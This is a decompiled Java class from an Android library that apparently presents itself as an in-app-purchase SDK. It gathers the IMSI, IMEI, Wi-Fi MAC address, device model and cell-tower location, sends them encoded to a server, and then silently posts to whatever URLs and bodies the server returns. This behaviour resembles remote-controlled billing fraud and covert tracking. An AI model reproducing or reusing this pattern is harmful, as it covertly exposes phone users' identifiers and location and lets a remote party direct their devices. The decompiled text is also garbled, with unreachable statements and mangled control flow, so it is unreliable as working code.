package com.shoufu.lib;

import android.util.Base64;
import android.util.Log;
import java.util.LinkedList;
import org.apache.http.client.utils.URLEncodedUtils;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONObject;

public class ao
{
  private String a = null;
  private int b = 0;
  private int c = 0;
  private int d = 55436;
  private String[] e = null;
  private String[] f = null;
  
  public ao() {}
  
  public static int a(String paramString1, String paramString2, String paramString3, String paramString4, String paramString5)
  {
    label738:
    do
    {
      try
      {
        LinkedList localLinkedList = new LinkedList();
        localLinkedList.add(new BasicNameValuePair("operation", "101"));
        localLinkedList.add(new BasicNameValuePair("telecom", paramString5));
        localLinkedList.add(new BasicNameValuePair("imsi", av.a()));
        localLinkedList.add(new BasicNameValuePair("imei", av.b()));
        localLinkedList.add(new BasicNameValuePair("model", av.d()));
        localLinkedList.add(new BasicNameValuePair("phoneos", "android"));
        localLinkedList.add(new BasicNameValuePair("wifimac", av.f()));
        localLinkedList.add(new BasicNameValuePair("sdk", av.c()));
        localLinkedList.add(new BasicNameValuePair("release", av.e()));
        localLinkedList.add(new BasicNameValuePair("channel_id", paramString4));
        localLinkedList.add(new BasicNameValuePair("sdk_version", "3.3.8"));
        localLinkedList.add(new BasicNameValuePair("sid", paramString2));
        localLinkedList.add(new BasicNameValuePair("app_id", paramString3));
        localLinkedList.add(new BasicNameValuePair("action_name", "session"));
        localLinkedList.add(new BasicNameValuePair("screen_width", String.valueOf(av.m())));
        localLinkedList.add(new BasicNameValuePair("screen_height", String.valueOf(av.n())));
        localLinkedList.add(new BasicNameValuePair("lac", String.valueOf(av.o())));
        localLinkedList.add(new BasicNameValuePair("cid", String.valueOf(av.p())));
        paramString3 = URLEncodedUtils.format(localLinkedList, "UTF-8");
        paramString4 = new aq(Base64.encodeToString(paramString3.getBytes(), 0)).b();
        paramString5 = new LinkedList();
        paramString5.add(new BasicNameValuePair("operation", "101"));
        paramString5 = URLEncodedUtils.format(paramString5, "UTF-8");
        paramString5 = paramString1 + "?" + paramString5;
        if (av.l())
        {
          Log.d("IAP", "101 operation:" + paramString5);
          Log.d("IAP", "101 params:" + paramString3);
          Log.d("IAP", "101 data:" + paramString4);
        }
        paramString4 = be.a(paramString5, paramString4);
        if (av.l()) {
          Log.d("IAP", "101 operation data:" + paramString4);
        }
        if (paramString4 == null) {
          break label738;
        }
        paramString3 = a(paramString4);
      }
      catch (Exception paramString1)
      {
        int i;
        Log.e("IAP", "do101Opertion error:" + paramString1.getMessage());
        return 64535;
      }
      paramString3.c();
      Thread.sleep(2000L);
      i = 0;
      for (;;)
      {
        if (i >= paramString3.b()) {
          return 0;
        }
        paramString4 = paramString3.b(i);
        if (av.l()) {
          Log.d("IAP", "do101Opertion youshu url:" + paramString3.a(i));
        }
        paramString4 = be.a(paramString3.a(i), paramString4, 0, paramString4.length);
        if (av.l()) {
          Log.d("IAP", "do101Opertion result:" + paramString4);
        }
        if (paramString3.a() == 1)
        {
          if (paramString4 == null) {
            break;
          }
          ap.a(paramString1, paramString2, 0, Base64.encodeToString(paramString4.getBytes(), 0), "101");
        }
        Thread.sleep(2000L);
        i += 1;
      }
      ap.a(paramString1, paramString2, 64534, "", "101");
      return 64534;
      paramString3 = null;
    } while ((paramString4 != null) && (paramString3 != null));
    return 64534;
  }
  
  public static ao a(String paramString)
  {
    ao localAo = new ao();
    try
    {
      paramString = new JSONObject(paramString);
      int j = paramString.getInt("result");
      if (j == 0)
      {
        localAo.b = paramString.getInt("notify");
        localAo.a = paramString.getString("sid");
        localAo.c = paramString.getInt("count");
        int i;
        if (localAo.c > 0)
        {
          localAo.e = new String[localAo.c];
          localAo.f = new String[localAo.c];
          i = 0;
          if (i < localAo.c) {}
        }
        for (;;)
        {
          localAo.d = j;
          return localAo;
          localAo.e[i] = paramString.getString("url" + String.valueOf(i + 1));
          localAo.f[i] = paramString.getString("body" + String.valueOf(i + 1));
          i += 1;
          break;
          if (av.l()) {
            Log.d("IAP", "not found url and body");
          }
        }
      }
      localAo.d += j;
    }
    catch (Exception paramString)
    {
      Log.e("IAP", "parseFromJson error:" + paramString.getMessage());
      return localAo;
    }
    if (av.l()) {
      Log.d("IAP", "return error:" + localAo.d);
    }
    return localAo;
  }
  
  public int a()
  {
    return this.b;
  }
  
  public String a(int paramInt)
  {
    if ((paramInt >= 0) && (paramInt < this.c)) {
      return new String(Base64.decode(this.e[paramInt], 0));
    }
    return null;
  }
  
  public int b()
  {
    return this.c;
  }
  
  public byte[] b(int paramInt)
  {
    if ((paramInt >= 0) && (paramInt < this.c)) {
      return Base64.decode(this.f[paramInt], 0);
    }
    return null;
  }
  
  public int c()
  {
    return this.d;
  }
}
